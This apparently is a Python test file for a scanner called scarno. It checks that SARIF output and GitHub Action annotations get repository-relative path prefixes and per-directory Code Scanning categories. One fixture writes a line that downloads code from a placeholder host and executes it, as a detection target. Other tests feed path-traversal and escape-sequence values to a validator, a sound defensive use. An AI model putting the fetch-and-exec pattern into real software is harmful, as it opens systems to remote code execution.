"""FR-281 / FR-282: SARIF paths and Code Scanning categories for a
subdirectory.

GitHub reads a relative SARIF URI as relative to the repository root
(docs: "SARIF support for code scanning"; codeql-action
``fingerprints.ts`` prefixes relative URIs with the source root). Scarno
reports paths relative to the analysed directory, so with the action's
``path: services/api`` a finding in ``services/api/app.py`` was uploaded
as ``app.py`` and landed on the wrong file, or none. Workflow-command
annotations have the same rule.

FR-281: ``--sarif-path-prefix`` prepends the analysed directory's
repository-relative path to every relative artifact URI, and the action
derives it from ``path``.

FR-282: each Code Scanning category keeps its own alert set, so two jobs
analysing different directories under one category would replace each
other's alerts. The action uses ``scarno`` at the root (unchanged, so
existing alerts keep their history) and ``scarno/<dir>`` otherwise.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

from scarno.models import (
    AnalysisResult,
    Dependency,
    DependencyStatus,
    Finding,
    FindingKind,
    FindingSeverity,
)
from scarno.reporters.sarif_reporter import (
    SarifReporter,
    sanitise_sarif_path_prefix,
)

_REPO_ROOT = Path(__file__).resolve().parents[2]
_ACTION = _REPO_ROOT / "action.yml"


# ── Reporter ────────────────────────────────────────────────────────────────


@pytest.mark.requirement("FR-281")
@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("", ""),
        (".", ""),
        ("./", ""),
        ("services/api", "services/api"),
        ("./services//api/", "services/api"),
        ("services\\api", "services/api"),
        ("my api/ünï", "my api/ünï"),
    ],
)
def test_prefix_normalises(raw: str, expected: str) -> None:
    assert sanitise_sarif_path_prefix(raw) == expected


@pytest.mark.requirement("FR-281")
@pytest.mark.parametrize(
    "raw",
    ["/abs/path", "\\\\server\\share", "C:\\repo\\api", "D:/a", "a/../b", "..",
     "a/\nb", "a\x1b[31m", "x" * 1025],
)
def test_prefix_rejects_non_relative_or_unsafe(raw: str) -> None:
    with pytest.raises(ValueError, match="--sarif-path-prefix"):
        sanitise_sarif_path_prefix(raw)


def _result() -> AnalysisResult:
    return AnalysisResult(
        project_type="python",
        project_path="/w/repo/services/my api",
        dependencies=[
            Dependency("boto3", None, DependencyStatus.SAFE, "unused", [], 0, 0,
                       source="requirements.txt", ecosystem="pypi"),
            Dependency("pandas", None, DependencyStatus.UNDECLARED, "r", [], 0, 0,
                       source="detected:pandas", ecosystem="pypi"),
            Dependency("re2js", None, DependencyStatus.IN_USE, "r", [], 0, 0,
                       source="package.json", ecosystem="npm", pin_override=True,
                       pin_override_kind="NPM_OVERRIDES",
                       pin_override_target="re2js@1"),
        ],
        errors=[],
        findings=[
            Finding(
                rule_id="TS-CE-001",
                kind=FindingKind.REMOTE_CODE_EXEC,
                severity=FindingSeverity.CRITICAL,
                file_path="pkg/a:b.py",
                line=3,
                snippet="exec(x)",
                message="exec() applied to a network response",
                remediation="Never execute untrusted remote content",
            ),
        ],
    )


def _uris(sarif: dict[str, Any]) -> dict[str, list[str]]:
    out: dict[str, list[str]] = {}
    for r in sarif["runs"][0]["results"]:
        out.setdefault(r["ruleId"], []).extend(
            loc["physicalLocation"]["artifactLocation"]["uri"]
            for loc in r["locations"]
        )
    return out


@pytest.mark.requirement("FR-281")
def test_prefix_reaches_every_result_kind() -> None:
    sarif = json.loads(SarifReporter(path_prefix="services/my api").render(_result()))
    assert _uris(sarif) == {
        "TS-CE-001": ["services/my%20api/pkg/a%3Ab.py"],
        "TS-DEP-SAFE": ["services/my%20api/requirements.txt"],
        "TS-DEP-UNDECLARED": ["services/my%20api/requirements.txt"],
        "TS-DEP-PIN-OVERRIDE-NPM": ["services/my%20api/package.json"],
    }
    assert sarif["runs"][0]["properties"]["pathPrefix"] == "services/my api"


@pytest.mark.requirement("FR-281")
def test_no_prefix_leaves_paths_alone() -> None:
    sarif = json.loads(SarifReporter().render(_result()))
    assert _uris(sarif)["TS-CE-001"] == ["pkg/a%3Ab.py"]
    assert sarif["runs"][0]["properties"]["pathPrefix"] == ""


@pytest.mark.requirement("FR-281")
def test_colon_in_first_segment_is_not_read_as_a_scheme() -> None:
    """``a:b.py`` at the root would parse as scheme ``a``. Encoding ``:``
    keeps it a relative reference (codeql-action decodes it back)."""
    result = _result()
    result.findings[0].file_path = "a:b.py"
    sarif = json.loads(SarifReporter().render(result))
    assert _uris(sarif)["TS-CE-001"] == ["a%3Ab.py"]


# ── CLI ─────────────────────────────────────────────────────────────────────


def _project(root: Path) -> Path:
    (root / "requirements.txt").write_text("requests\n", encoding="utf-8")
    (root / "app.py").write_text(
        'import requests\nexec(requests.get("https://x.example/p").text)\n',
        encoding="utf-8",
    )
    return root


@pytest.mark.requirement("FR-281")
def test_cli_applies_the_prefix(runner, tmp_path: Path) -> None:
    from scarno.cli import app

    (tmp_path / "proj").mkdir()
    root = _project(tmp_path / "proj")
    out = tmp_path / "out.sarif"
    result = runner.invoke(app, [
        str(root), "--format", "sarif", "--output", str(out),
        "--sarif-path-prefix", "./services/api/",
    ])
    assert result.exit_code == 3, result.output
    uris = _uris(json.loads(out.read_text(encoding="utf-8")))
    assert uris["TS-CE-001"] == ["services/api/app.py"]


@pytest.mark.requirement("FR-281")
@pytest.mark.parametrize(
    ("argv", "message"),
    [
        (["--format", "json", "--sarif-path-prefix", "x"],
         "only applies to --format sarif"),
        (["--format", "sarif", "--sarif-path-prefix", "../x"], "'..' segments"),
        (["--format", "sarif", "--sarif-path-prefix", "/abs"], "relative"),
    ],
)
def test_cli_rejects_misuse(
    runner, tmp_path: Path, argv: list[str], message: str
) -> None:
    from scarno.cli import app

    result = runner.invoke(app, [str(_project(tmp_path)), *argv])
    assert result.exit_code == 2
    assert message in result.output


# ── Action ──────────────────────────────────────────────────────────────────


def _step(step_id: str) -> dict[str, Any]:
    manifest = yaml.safe_load(_ACTION.read_text(encoding="utf-8"))
    (step,) = [s for s in manifest["runs"]["steps"] if s.get("id") == step_id]
    return step


def _stub_scarno(bin_dir: Path, *, supports_prefix: bool) -> Path:
    """A ``scarno`` on PATH that records its argv and fakes --help."""
    bin_dir.mkdir(parents=True, exist_ok=True)
    flag = "--sarif-path-prefix" if supports_prefix else ""
    stub = bin_dir / "scarno"
    stub.write_text(
        "#!/bin/bash\n"
        'if [[ "$1" == "--help" ]]; then echo "--format --exclude ' + flag + '"; exit 0; fi\n'
        'printf "%s\\n" "$@" > "$SCARNO_ARGV"\n'
        'touch "$(pwd)/scarno.sarif"\n'
        "exit 0\n",
        encoding="utf-8",
    )
    stub.chmod(0o755)
    return bin_dir


def _bash(script: str, cwd: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash not available")
    full_env = {"PATH": f"{env.pop('BIN')}:/usr/bin:/bin", **env}
    return subprocess.run(
        [bash, "-e", "-c", script], cwd=cwd, env=full_env,
        capture_output=True, text=True, check=False,
    )


def _outputs(path: Path) -> dict[str, str]:
    lines = path.read_text(encoding="utf-8").splitlines() if path.exists() else []
    return dict(line.split("=", 1) for line in lines)


def _scope(tmp_path: Path, path: str, *, category: str = "",
           supports_prefix: bool = True) -> tuple[dict[str, str], str]:
    ws = tmp_path / "ws"
    (ws / "services" / "my api").mkdir(parents=True, exist_ok=True)
    (tmp_path / "outside").mkdir(exist_ok=True)
    out = tmp_path / "scope_output"
    out.unlink(missing_ok=True)
    proc = _bash(_step("scope")["run"], ws, {
        "BIN": str(_stub_scarno(tmp_path / "bin", supports_prefix=supports_prefix)),
        "GITHUB_OUTPUT": str(out),
        "TS_PATH": path,
        "TS_CATEGORY": category,
        "TS_WORKSPACE": str(ws),
    })
    assert proc.returncode == 0, proc.stderr
    return _outputs(out), proc.stdout


@pytest.mark.requirement("FR-281")
@pytest.mark.requirement("FR-282")
@pytest.mark.parametrize(
    ("path", "prefix", "category"),
    [
        (".", "", "scarno"),
        ("services/my api", "services/my api", "scarno/services/my api"),
        ("./services/../services/my api/", "services/my api",
         "scarno/services/my api"),
    ],
)
def test_scope_step_derives_prefix_and_category(
    tmp_path: Path, path: str, prefix: str, category: str
) -> None:
    outputs, _ = _scope(tmp_path, path)
    assert outputs["prefix"] == prefix
    assert outputs["category"] == category
    assert outputs["prefix-supported"] == "true"


@pytest.mark.requirement("FR-282")
def test_category_input_overrides(tmp_path: Path) -> None:
    outputs, _ = _scope(tmp_path, "services/my api", category="deps-api")
    assert outputs["category"] == "deps-api"


@pytest.mark.requirement("FR-281")
def test_path_outside_workspace_warns_and_adds_no_prefix(tmp_path: Path) -> None:
    outputs, stdout = _scope(tmp_path, str(tmp_path / "outside"))
    assert outputs["prefix"] == ""
    assert "::warning" in stdout and "outside github.workspace" in stdout


@pytest.mark.requirement("FR-281")
def test_old_scarno_is_detected(tmp_path: Path) -> None:
    outputs, _ = _scope(tmp_path, "services/my api", supports_prefix=False)
    assert outputs["prefix-supported"] == "false"


def _run_step(tmp_path: Path, *, fmt: str, prefix: str,
              supported: str) -> tuple[list[str], str]:
    argv_file = tmp_path / "argv"
    proc = _bash(_step("run")["run"], tmp_path, {
        "BIN": str(_stub_scarno(tmp_path / "bin", supports_prefix=True)),
        "GITHUB_OUTPUT": str(tmp_path / "run_output"),
        "SCARNO_ARGV": str(argv_file),
        "TS_PATH": ".",
        "TS_FORMAT": fmt,
        "TS_OUTPUT": "scarno.sarif",
        "TS_SEVERITY": "HIGH",
        "TS_SHOW_SUPPRESSED": "false",
        "TS_PREFIX": prefix,
        "TS_PREFIX_SUPPORTED": supported,
    })
    assert proc.returncode == 0, proc.stderr
    return argv_file.read_text(encoding="utf-8").splitlines(), proc.stdout


@pytest.mark.requirement("FR-281")
def test_run_step_passes_the_prefix_for_a_subdirectory(tmp_path: Path) -> None:
    argv, _ = _run_step(tmp_path, fmt="sarif", prefix="services/my api",
                        supported="true")
    i = argv.index("--sarif-path-prefix")
    assert argv[i + 1] == "services/my api"


@pytest.mark.requirement("FR-281")
@pytest.mark.parametrize(
    ("fmt", "prefix", "supported", "warns"),
    [
        ("sarif", "", "true", False),            # root: nothing to add
        ("json", "services/api", "true", False),  # flag is SARIF-only
        ("sarif", "services/api", "false", True), # old scarno: warn, don't break
    ],
)
def test_run_step_omits_the_flag_when_it_must(
    tmp_path: Path, fmt: str, prefix: str, supported: str, warns: bool
) -> None:
    argv, stdout = _run_step(tmp_path, fmt=fmt, prefix=prefix, supported=supported)
    assert "--sarif-path-prefix" not in argv
    assert ("::warning" in stdout) is warns


@pytest.mark.requirement("FR-282")
def test_upload_uses_the_scope_category() -> None:
    manifest = yaml.safe_load(_ACTION.read_text(encoding="utf-8"))
    (upload,) = [
        s for s in manifest["runs"]["steps"]
        if str(s.get("uses", "")).startswith("github/codeql-action/upload-sarif")
    ]
    assert upload["with"]["category"] == "${{ steps.scope.outputs.category }}"
    assert "category" in manifest["inputs"]


@pytest.mark.requirement("FR-281")
@pytest.mark.parametrize(
    ("prefix", "expected"),
    [("services/api", "file=services/api/src/x.py"), ("", "file=src/x.py")],
)
def test_annotations_use_repository_paths(
    tmp_path: Path, prefix: str, expected: str
) -> None:
    from tests.unit.test_req8_github_action import _extract_collect_script

    script = _extract_collect_script(_ACTION.read_text(encoding="utf-8"))
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"dependencies": [], "findings": [{
        "severity": "HIGH", "file_path": "src/x.py", "line": 2,
        "rule_id": "TS-SI-001", "message": "m",
    }]}), encoding="utf-8")
    proc = subprocess.run(
        [sys.executable, "-"], input=script, cwd=tmp_path, text=True,
        capture_output=True, check=False,
        env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
             "GITHUB_OUTPUT": str(tmp_path / "out"), "TS_ANNOTATE": "true",
             "TS_JSON": str(report), "TS_PREFIX": prefix},
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.startswith(f"::error {expected},line=2,"), proc.stdout
